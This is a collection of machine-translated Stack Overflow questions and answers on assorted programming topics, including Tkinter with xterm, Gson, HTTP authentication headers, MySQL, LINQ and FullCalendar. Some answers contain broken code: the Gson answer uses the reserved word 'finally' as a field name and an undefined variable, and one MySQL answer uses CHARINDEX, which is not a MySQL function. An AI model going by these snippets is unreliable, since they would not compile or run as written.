我正在使用以下 python 代码在 Tkinter 窗口中嵌入终端窗口（来自 Ubuntu Linux）。我想在终端窗口启动时自动在窗口中给出命令“sh kBegin”：

```
from Tkinter import *
from os import system as cmd

root = Tk()
termf = Frame(root, height=800, width=1000)

termf.pack(fill=BOTH, expand=YES)
wid = termf.winfo_id()
cmd('xterm -into %d -geometry 160x50 -sb &' % wid)

root.mainloop() 
```

伪：

```
cmd('xterm -into %d -geometry 160x50 -sb &' % wid)
embedded_terminal('sh kBegin')
# EMBEDDED TERMINAL DISPLAYS OUTPUT OF sh kBegin## 
```

我将如何让这个工作？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-20T15:51:09.257

您可以通过编写伪终端从属子进程来与 shell 交互。这是它如何工作的演示。这个答案在某种程度上基于对[*Linux 伪终端的回答：执行从一个终端发送到另一个终端的字符串*](https://stackoverflow.com/a/8677671/428236)。

关键是获取 xterm 使用的伪终端（通过`tty`命令）并将您的方法的输出和输入重定向到这个伪终端文件。例如`ls < /dev/pts/1 > /dev/pts/1 2> /dev/pts/1`

注意

1.  xterm 子进程被泄露（`os.system`不推荐使用，尤其是`&`指令。见[`suprocess`模块](http://docs.python.org/library/subprocess.html#module-subprocess)）。
2.  可能无法以编程方式找到使用了哪个 tty
3.  每个命令都在一个新的 suprocess 中执行（只显示输入和输出），所以状态修改命令如`cd`没有效果，以及 xterm 的上下文（`cd`在 xterm 中）

```
from Tkinter import *
from os import system as cmd

root = Tk()
termf = Frame(root, height=700, width=1000)
termf.pack(fill=BOTH, expand=YES)
wid = termf.winfo_id()

f=Frame(root)
Label(f,text="/dev/pts/").pack(side=LEFT)
tty_index = Entry(f, width=3)
tty_index.insert(0, "1")
tty_index.pack(side=LEFT)
Label(f,text="Command:").pack(side=LEFT)
e = Entry(f)
e.insert(0, "ls -l")
e.pack(side=LEFT,fill=X,expand=1)

def send_entry_to_terminal(*args):
    """*args needed since callback may be called from no arg (button)
   or one arg (entry)
   """
    command=e.get()
    tty="/dev/pts/%s" % tty_index.get()
    cmd("%s <%s >%s 2> %s" % (command,tty,tty,tty))

e.bind("<Return>",send_entry_to_terminal)
b = Button(f,text="Send", command=send_entry_to_terminal)
b.pack(side=LEFT)
f.pack(fill=X, expand=1)

cmd('xterm -into %d -geometry 160x50 -sb -e "tty; sh" &' % wid)

root.mainloop() 
```

# java - 使用 GSON 给出错误预期 BEGIN_ARRAY 但为 STRING

> ID：10239969
> 
> 赞同：2
> 
> 时间：2012-04-20T03:47:06.330
> 
> 标签：java, android, json, gson

示例 JSON 对象如下所示：

```
[{"Title":"John Doe","Address":{"AddressLines":["The Place","123 New Place","London","England"],"Postcode":"NW7 XXY"},"Telephone":"0012345","Email":"","Latitude":51.5024472101345,"Longitude":-0.557585646554,"Easting":500623,"Northing":179647}] 
```

假设通过链接 www.domain.com 访问上述对象，并​​且我有以下类来表示数据

```
public class LocationData extends Data{

    private Address Address;
    private String Telephone;
    private String Email;
    private String Latitude;
    private String Longitude;
    private String Easting;
    private String Northing;

    public Address getAddress() {
        return Address;
    }

    public void setAddress(Address address) {
        Address = address;
    }

    public String getTelephone() {
        return Telephone;
    }

    public void setTelephone(String telephone) {
        Telephone = telephone;
    }

    public String getEmail() {
        return Email;
    }

    public void setEmail(String email) {
        Email = email;
    }

    public String getLatitude() {
        return Latitude;
    }

    public void setLatitude(String latitude) {
        Latitude = latitude;
    }

    public String getLongitude() {
        return Longitude;
    }

    public void setLongitude(String longitude) {
        Longitude = longitude;
    }

    public String getEasting() {
        return Easting;
    }

    public void setEasting(String easting) {
        Easting = easting;
    }

    public String getNorthing() {
        return Northing;
    }

    public void setNorthing(String northing) {
        Northing = northing;
    }

} 
```

地址类如下：

```
public class Address {

    public String[] AddressLines;

    public String Postcode;

    public String getPostcode() {
        return Postcode;
    }

    public void setPostcode(String postcode) {
        Postcode = postcode;
    }

    public String[] getAddressLines() {
        return AddressLines;
    }

    public void setAddressLines(String addressLines[]) {
        AddressLines = addressLines;
    }

} 
```

当我尝试跑步时

```
LocationData[] data = gson.fromJson(this.locationServiceUrl, LocationData[].class);
return data; 
```

我收到以下错误：

预期为 BEGIN_ARRAY，但在上述代码行中是字符串。我不确定我设置课程的方式是否有问题。注意：我使用的是数组 (LocationData[] data)，因为服务返回多个位置，尽管我在上面显示的示例中只包含了一个。非常感谢任何有关为什么会发生这种情况的帮助。我在这里查看了一些类似的错误，但提供的修复似乎都不适合我。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-20T04:01:43.393

```
{
    "finally":[
        {
            "Title":"John Doe",
            "Address": {
                "AddressLines":[
                    "The Place",
                    "123 New Place",
                    "London",
                    "England"
                ],
                "Postcode":"NW7XXY"
            },
            "Telephone":"0012345",
            "Email":"",
            "Latitude":51.5024472101345,
            "Longitude":-0.557585646554,
            "Easting":500623,
            "Northing":179647
        }
    ]
} 
```

解析这个 JSON 的代码是：

```
public class mainData {

    public List<LocationData> finally;

    public String[] getLocationData() {
        return AddressLines;
    }

    public void setLocationData(List<LocationData> finally) {
        this.finally = finally;
    }
} 
```

这是因为当您使用 Gson 解析这种类型的 Json 时，您的字符串以开头，`[`那么您需要为其添加一个标签前缀，就像我喜欢的那样 ( `{"finally": your data }`)。

实际上 Gson 试图映射标签及其值，但在您的情况下，您`[`不包含 Gson 可以映射的标签。

# http-authentication - 多个方案的 WWW-Authenticate 的分隔符是什么？

> ID：10239970
> 
> 赞同：28
> 
> 时间：2012-04-20T03:47:21.730
> 
> 标签：http-authentication

我已通读[RFC 2617](http://www.ietf.org/rfc/rfc2617.txt)，但如果支持多个方案，则无法在此处或其他任何地方找到分隔符。例如，假设同时支持 Basic 和 Digest。我知道它可能会这样出现：

```
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic
WWW-Authenticate: Digest 
```

但我也读到两者都可以列为一行，但没有人展示示例或描述要使用的分隔符。我已经看到可以*在*单个方案中使用逗号的警告：

```
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Digest param1="foo", param2="bar" 
```

我还读到*如果*在一个方案中使用逗号，其他方案必须放在单独的行上。所以我想在上述情况下，如果我们添加 Basic，它会如下所示：

```
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Digest param1="foo", param2="bar"
WWW-Authenticate: Basic 
```

这很简单。但现在假设你只有一条线

```
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Scheme stuff, morestuff, more stuff 
```

那是哪个？那是逗号分隔的方案列表，还是只有几个参数的方案？

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2012-06-28T22:02:22.673

据我所知，[该规范](http://www.ietf.org/rfc/rfc2617.txt)对这个问题进行了抨击。第 1.2 节规定：

> 注意：用户代理在解析 WWW **-Authenticate 或 Proxy-Authenticate 标头字段值时****需要特别小心，如果它包含 多个挑战** ，或者如果提供了多个 WWW-Authenticate 标头
> 字段，因为挑战的内容它本身可能
> 包含一个以逗号分隔的身份验证参数列表。

我想我们可以把*特别关心*翻译成*祝你好运*。

**实用主义**
作为一个实际问题，我怀疑多个方案意味着一个应该使用多个`wwww-authenticate`标题。方案是可扩展的；例如，如果我想变得险恶，我可以想出一个名为“草莓”或“不透明”的方案。鉴于此，如果没有某种“方案终止”定界符，就没有真正的好方法来解析单行。

**W3C 讨论**
你不是第一个提出这个问题的人。W3C 邮件列表上有[一个讨论。](http://lists.w3.org/Archives/Public/ietf-http-wg/2009OctDec/0300.html)海报说：

> 我并没有质疑在单一响应中提供多个挑战的必要性。考虑到它创建的分隔符的奇怪组合，我只是质疑在单个标题字段中允许多个挑战是否明智。

其他一些讨论当前问题和可能感兴趣的未来行动的线程：

*   [上述线程的根](http://lists.w3.org/Archives/Public/ietf-http-wg/2009OctDec/0295.html)
*   [身份验证头的向后定义](http://lists.w3.org/Archives/Public/ietf-http-wg/2009OctDec/0298.html)
*   [#342 WWW-验证 ABNF 有点模棱两可](http://lists.w3.org/Archives/Public/ietf-http-wg/2012JanMar/0411.html)
*   [WWW-Authenticate ABNF 不明确](http://lists.w3.org/Archives/Public/ietf-http-wg/2011JulSep/0329.html)
*   [*未来的 http 2* - HTTP 多路复用的多腿身份验证](http://lists.w3.org/Archives/Public/ietf-http-wg/2012AprJun/0690.html)

**如果只是......**
不是我有胃口，但可以挖掘 chromimum、firefox 和 webkit 代码，看看这些社区是如何处理这个问题的。

# java - 如何在 JDBC 中执行多个查询

> ID：10239973
> 
> 赞同：0
> 
> 时间：2012-04-20T03:47:57.157
> 
> 标签：java, jdbc, prepared-statement

我想执行两个查询，一个用于插入，另一个用于更新。如果插入成功，那么我必须更新一个条目。是否可以使用 PreparedStatement？我也想动态设置参数。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T05:00:23.890

您可以将[setAutoCommit](http://docs.oracle.com/javase/1.4.2/docs/api/java/sql/Connection.html#setAutoCommit%28boolean%29)设置为 false，执行两个单独的语句，然后手动提交事务。

# mysql - 如何在Mysql中拆分列？

> ID：10239975
> 
> 赞同：2
> 
> 时间：2012-04-20T03:48:18.140
> 
> 标签：mysql, string, split

我有一个值是结合两个元素的列，就像“Class_Name”一样。例如，“Websites_Google”。但是由于一些历史原因，有一些特殊的值没有“Class_”前缀，比如“yahoo”。

现在我需要从列中提取类。如果没有 "class_" 前缀，我希望返回 "" 。我只是尝试这样的 SUBSTRING_INDEX 函数：

```
select SUBSTRING_INDEX(column1, '_', 1) ....... 
```

当值有“class_”时它工作得很好，但在没有“class_”的情况下，它返回整个值，“yahoo”返回“yahoo”，而不是我想要的空字符串。

如何解决？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T03:54:46.600

请检查以下内容

```
select case when CHARINDEX ('_', column1)>0 then SUBSTRING_INDEX(column1, '_', 1) else '' end ..... 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T03:58:07.173

您可以使用`IF` [检查下划线是否存在](http://sqlfiddle.com/#!2/97334/2)：

```
select if(locate('_',column1)=0,'',SUBSTRING_INDEX(column1, '_', 1))
from mytable 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T04:47:28.763

您将必须创建一个 mysql 函数。这是一个工作示例：

```
DELIMITER $$

DROP FUNCTION IF EXISTS `test`.`split_class` $$
CREATE FUNCTION `test`.`split_class` (`class` varchar(25)) RETURNS varchar(25)
BEGIN

DECLARE `tmp1` varchar(25);
DECLARE `tmp2` varchar(25);
DECLARE `ret` varchar(25);

  set `tmp1` = SUBSTRING_INDEX(`class`, '_', 1);
  set `tmp2` = SUBSTRING_INDEX(`class`, '_', -1);
  set `ret` = '';

  IF `tmp1` != `tmp2`
    then set `ret` = `tmp1`;
  END IF;

  RETURN `ret`;
END $$

DELIMITER ; 
```

然后，尝试选择

```
SELECT split_class(last) FROM test.`table` t; 
```

# .net - ADO.Net 最佳实践 - 进行异步数据库调用时的单连接与多连接

> ID：10239977
> 
> 赞同：4
> 
> 时间：2012-04-20T03:48:35.017
> 
> 标签：.net, sql, asynchronous, ado.net, odp.net

我正在使用 ADO.Net 连接到一些 Sql Server 和 Oracle 数据库，并且我想同时运行一些查询。

我将 SqlClient 命名空间中的类用于 Sql Server 和 ODP.Net 用于 Oracle。对于 Sql Server，我在连接字符串中添加了 MARS 选项，并在 SqlCommand 上调用异步 API。ODP.Net 不提供异步 API，因此我必须为并发 Oracle 命令提供单独的线程。

我的问题是，我应该如何处理连接对象？我应该为每个数据库实例创建一个 DbConnection 并针对单个连接异步执行命令，还是应该为每个并发命令提供一个单独的连接对象？共享连接对象是否会成为同时通过它执行的多个命令的争用点？

我将编写一些比较测试，但很想听听有异步数据库命令经验的人的意见。先感谢您！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-20T05:01:42.567

前段时间我们遇到了这个问题，并选择为每个并发命令处理一个单独的连接对象。这是一个大量使用数据库的应用程序（每个页面执行大约 40 个查询）。由于连接创建，我们看到这非常慢。

因此，我们将其更改为每个执行的命令都使用的单个连接（单例）。这解决了问题，我们很高兴看到应用程序响应速度更快。然而，应用程序开始增长，交易需求迫切，但我们面临的问题是，这在我们的模型中是不可能的。我们最终使用了一个混合：每当连接需要事务时，我们创建一个新的，如果不需要事务，那么我们重用在单例中创建的那个。

我现在要做的是使用单个连接并在调用的存储过程中使用事务模式；避免必须在应用程序服务器上处理事务。

希望对您有所帮助。

# git - CCNet 多个 git 仓库超时异常

> ID：10239980
> 
> 赞同：2
> 
> 时间：2012-04-20T03:48:48.547
> 
> 标签：git, cruisecontrol.net

我们有以下设置：

*   Win 7 专业版 64 位
*   CCNet v1.6.7981.1
*   msysgit v1.7.9-preview20120201

我们的 Git 服务器安装在另一台运行 64 位 Ubuntu 服务器的机器上。CCNet windows 服务以管理员帐户运行，并使用 ssh 访问 Ubuntu git 服务器。在执行强制构建时，我们没有问题，获取源代码和构建都很好。当它在时间触发器上运行时，我们会得到以下异常：

```
ThoughtWorks.CruiseControl.Core.CruiseControlException: Source control operation has timed out.
   at ThoughtWorks.CruiseControl.Core.Sourcecontrol.ProcessSourceControl.Execute(ProcessInfo processInfo)
   at ThoughtWorks.CruiseControl.Core.Sourcecontrol.Git.GitFetch(IIntegrationResult result)
   at ThoughtWorks.CruiseControl.Core.Sourcecontrol.Git.CreateUpateLocalRepository(IIntegrationResult result)
   at ThoughtWorks.CruiseControl.Core.Sourcecontrol.Git.GetModifications(IIntegrationResult from, IIntegrationResult to)
   at ThoughtWorks.CruiseControl.Core.Sourcecontrol.MultiSourceControl.GetModifications(IIntegrationResult from, IIntegrationResult to)
   at ThoughtWorks.CruiseControl.Core.Sourcecontrol.QuietPeriod.GetModificationsWithLogging(ISourceControl sc, IIntegrationResult from, IIntegrationResult to)
   at ThoughtWorks.CruiseControl.Core.Sourcecontrol.QuietPeriod.GetModifications(ISourceControl sourceControl, IIntegrationResult lastBuild, IIntegrationResult thisBuild)
   at ThoughtWorks.CruiseControl.Core.IntegrationRunner.GetModifications(IIntegrationResult from, IIntegrationResult to)
   at ThoughtWorks.CruiseControl.Core.IntegrationRunner.Integrate(IntegrationRequest request) 
```

我们的 ccnet 项目使用多个 git 存储库，示例配置如下所示：

```
<sourcecontrol type="multi">
      <sourceControls>
        <git>
          <repository>git@somerepo.git</repository>
          <executable>$(gitcmdpath)</executable>
          <timeout units="minutes">10</timeout>
        </git>
        <git>
          <repository>git@somerepo2.git</repository>
          <executable>$(gitcmdpath)</executable>
          <timeout units="minutes">10</timeout>
          <workingDirectory>c:\somerepo2</workingDirectory>
        </git>
      </sourceControls>
    </sourcecontrol> 
```

我们有几个 ccnet 项目使用相同的存储库集（尽管签出到不同的文件夹），并且在没有代码更改时它们都以相同的方式失败。我碰巧将间隔触发器设置为相同的长度，因此它们都大致同时检查存储库。这可能是他们超时的原因吗？我也找不到任何从 ccnet.log 中引用这个来调试它的东西。

欢迎任何帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T05:25:14.213

我目前有一个解决方法，将连续构建放入一个队列并将完整构建放入另一个队列。连续构建基于每隔 30 秒的源代码控制修改，而完整构建每天一次，因此它们现在是分开的。我已经实施了大约 2 周，没有任何问题。

# java - Java：如何将 Trident 导入到我的项目中？

> ID：10239981
> 
> 赞同：0
> 
> 时间：2012-04-20T03:48:48.400
> 
> 标签：java, animation

我正在尝试在我的项目中使用 Trident 动画库。我已将 trident.jar 添加到我的 Eclipse 项目的构建路径中，但我仍然收到构建路径错误。缺少库所需的存档。

也许我是愚蠢的，但我似乎无法在网站上找到这样的东西。根据网上的例子，我认为 .jar 是我唯一需要的东西。而且似乎也没有要导入的完整 Eclipse 项目。

如果我错过了一些愚蠢的事情，请告诉我。谢谢！

这是确切的错误： 所需库的描述资源路径位置类型存档：项目“SP-Reversi”中的“/home/josh/Software/Eclipse Java EE/Trident/trident.jar”无法读取或不是有效的 ZIP文件 SP-Reversi 构建路径 构建路径问题

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T05:09:09.360

这`trident.jar`是您唯一需要的罐子。错误消息表明，您`trident.jar`的已损坏。尝试解压文件：

```
jar -xvf trident.jar 
```

恕我直言，这将产生错误。尝试再次下载jar...

# jquery - jQuery FullCalendar：在议程视图中禁用滚动？

> ID：10239986
> 
> 赞同：15
> 
> 时间：2012-04-20T03:49:04.220
> 
> 标签：jquery, jquery-plugins, fullcalendar

如何使用 FullCalendar jQuery 插件禁用议程视图（周、日模式）中的滚动？在月模式下一切都很好，但是当我更改为周/日模式时，我的主页滚动条旁边有一个滚动条。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-05-26T21:46:15.557

这就是我在我的情况下所做的。目标是动态改变高度，所以我以这种方式使用了 viewDisplay 事件：

```
$('#calendar').fullCalendar({
    viewDisplay: function (view) {
        var h;
        if (view.name == "month") {
            h = NaN;
        }
        else {
            h = 2500;  // high enough to avoid scrollbars
        }

        $('#calendar').fullCalendar('option', 'contentHeight', h);
    }
}); 
```

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2014-08-22T05:50:59.870

从 FullCalendar 2.1.0-beta1 开始，您可以设置`{ height: 'auto' }`选项以禁用视图中的滚动条。

尽管此新功能的更改日志条目可以读作“在月视图中关闭滚动条”，但它实际上适用于所有视图。

> 在月视图中，当事件过多导致日历高度溢出时，会出现垂直滚动条。要关闭此行为，请将高度选项设置为“自动”。--[从 v2.1.0-beta1 更新日志](https://github.com/arshaw/fullcalendar/releases/tag/v2.1.0-beta1)

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2015-10-20T10:37:30.517

只需使用：

```
$('#calendar').fullCalendar({
    height: "auto"
}); 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-04-21T07:49:44.880

当然

```
$('#calendar').fullCalendar({
    height: 999999999
}); 
```

如果您的日历在您不想要的时候有滚动条，那么您有 3 个选项：

1.  让它足够大以至于它不会有滚动条
2.  缩小内容，使其适合您的单词
3.  删除滚动条并无法访问未显示的信息

你需要比“我不喜欢滚动条”更具体

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-06-11T09:51:04.670

这是@Deulis 答案的更新和缩短版本：

```
$("#calendar").fullCalendar({
  viewRender: function(view){
    $("#calendar").fullCalendar("option", "contentHeight", (view.name === "month")? NaN : 9999);
  }
}); 
```

正如@Pierre de LESPINAY 和@Jens-André Koch 已经提到的，[viewDisplay](http://arshaw.com/fullcalendar/docs1/removed/viewDisplay/)在 fullcalendar v2.0 中被贬低了。我们必须改用[viewRender](http://arshaw.com/fullcalendar/docs/display/viewRender/)。

# linq - 在一个 LINQ 查询中获取两列的总和而不进行分组

> ID：10239987
> 
> 赞同：12
> 
> 时间：2012-04-20T03:49:33.833
> 
> 标签：linq, entity-framework, linq-to-sql

我想在一个查询中总结一个表的三个不同字段。我想要这个 T-SQL 的 linq 等价物：

```
select sum(fld1), SUM(fld2),  SUM(fld3)   from MyTable where classID = 5 
```

我发现的所有示例都使用 group by 或多次调用查询，每个需要汇总的字段一次。

我现在有这样的东西。但我不想给它添加一个 group by 子句，因为它的 T-SQL 形式不需要它。

```
from a in MyTable
where a.classID == 5
group a by a.classID into g
select new 
{
Sumfld1 =  g.Sum(x => x.fld1 ), 
Sumfld2 = g.Sum(x => x.fld2),
Sumfld3 = g.Sum(x => x.fld3)
} 
```

有什么建议么？谢谢你的时间。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-04-20T13:26:52.873

事实证明，在 linq-to-sql 中，您可以通过以下方式非常接近：

```
from a in MyTable
where a.classID == 5
group a by 0 into g
select new 
{
    Sumfld1 = g.Sum(x => x.fld1), 
    Sumfld2 = g.Sum(x => x.fld2),
    Sumfld3 = g.Sum(x => x.fld3)
} 
```

（注意按**0**分组）

它不会转换为 sql `GROUP BY`，而是来自子查询`SELECT`的多个`SUM`s 。就执行计划而言，它甚至可能是相同的。

实体框架仍然创建`GROUP BY`一个`0`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T06:09:51.350

```
var x = from a in MyTable 
        where a.classID == 5 
        select a;

int? Sumfld1 = x.Sum(y => y.fld1);
int? Sumfld2 = x.Sum(y => y.fld2);
int? Sumfld3 = x.Sum(y => y.fld3); 
```

# java - 如何打印JUNG的以下对象返回的最短路径的顶点

> ID：10239992
> 
> 赞同：1
> 
> 时间：2012-04-20T03:50:18.383
> 
> 标签：java, jung

DijkstraDistance shortestPath = new DijkstraDistance(network);

有没有办法显示最短路径返回的顶点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T16:27:43.000

```
ShortestPathUtils.getPath() 
```

就是你要找的。

# xcode - Xcode，导航视图控制器

> ID：10239996
> 
> 赞同：0
> 
> 时间：2012-04-20T03:51:18.810
> 
> 标签：xcode, navigation, viewcontroller

我有一个故事板序列如下。

SplashView 控制器 > NavigationController > TableViewController

如何编写代码，以便当我单击 SplashViewController 中的按钮时，我将被定向到带有 NavigationBar 的 TableViewController。因为目前，当我编码时，我认为我直接链接到 TableView 而不是 NavigationController，因此不显示导航栏。我知道在故事板中，我所要做的就是使用“模态”并单击并指向导航控制器。但我怎样才能通过编码来实现它。

大佬们需要代码吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-23T03:45:44.633

基本上我想要实现的是类似于启动加载屏幕。我有一个委托方法，它在竞争从网络收集数据时接收来自另一个类的信号。任何有兴趣以这种方式进行飞溅的人，下面是答案。

```
-(void) receivedData{

UIStoryboard *storyboard = [UIStoryboard storyboardWithName:@"MainStoryboard_iPhone" bundle:[NSBundle mainBundle]];
UINavigationController *secondView = [storyboard instantiateViewControllerWithIdentifier:@"NavigationController"];
[self presentModalViewController:secondView animated:YES];
} 
```

无论如何，上述方法有可能给我一个转换错误，因为视图可能会在不等待当前视图完成的情况下进入下一个视图，从而导致潜在的崩溃。只需添加方法

```
 -viewDidAppear() 
```

并在 viewDidAppear 中运行您的代码